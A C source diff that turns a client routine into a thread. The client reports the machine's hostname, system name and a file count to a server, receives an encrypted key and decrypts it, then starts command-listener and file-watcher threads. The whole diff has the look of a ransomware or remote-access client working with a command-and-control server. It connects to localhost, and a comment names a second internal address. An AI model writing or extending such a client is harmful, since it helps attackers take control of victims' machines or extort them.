@@ -87,7 +87,7 @@ void *commands_listener(void *arg) {
     }
 }
 
-int startclient() {
+void *startclient(void *arg) {
     int status;
     int valread;
     int client_fd;
@@ -96,7 +96,7 @@ int startclient() {
 
     if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         printf("socket creation failed\n");
-        return -1;
+        return 0;
     }
 
     serv_addr.sin_family = AF_INET;
@@ -104,11 +104,11 @@ int startclient() {
 
     if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) { //127.0.0.1, 10.172.20.145
         printf("inet_pton failed\n");
-        return -1;
+        return 0;
     }
     if ((status = connect(client_fd, (struct sockaddr *) &serv_addr, sizeof(serv_addr))) < 0) {
         printf("connect failed\n");
-        return -1;
+        return 0;
     }
 
     char* hey = "PC connected, number of file : ";
@@ -117,7 +117,7 @@ int startclient() {
 
     if (uname(&name) == -1) {
         perror("uname");
-        return 1;
+        return 0;
     }
     char* nodename = name.nodename;
     char* sysname = name.sysname;
@@ -134,14 +134,8 @@ int startclient() {
     send(client_fd, ret, strlen(ret), 0);
     free(model);
 
-    printf("still here??\n");
-
     unsigned char encrypted[256];
     int received = recv(client_fd, encrypted, sizeof(encrypted), 0);
-    if (received != 256) {
-        printf("key receive failed, got %d bytes\n", received);
-        return -1;
-    }
     decrypt_key(encrypted);
 
     int *clientfd = malloc(sizeof(int));
@@ -153,5 +147,5 @@ int startclient() {
     pthread_create(&watcher_tid, NULL, start_watcher, NULL);
     pthread_join(watcher_tid, NULL);
     pthread_join(command_tid, NULL);
-    return client_fd;
+    return 0;
 }
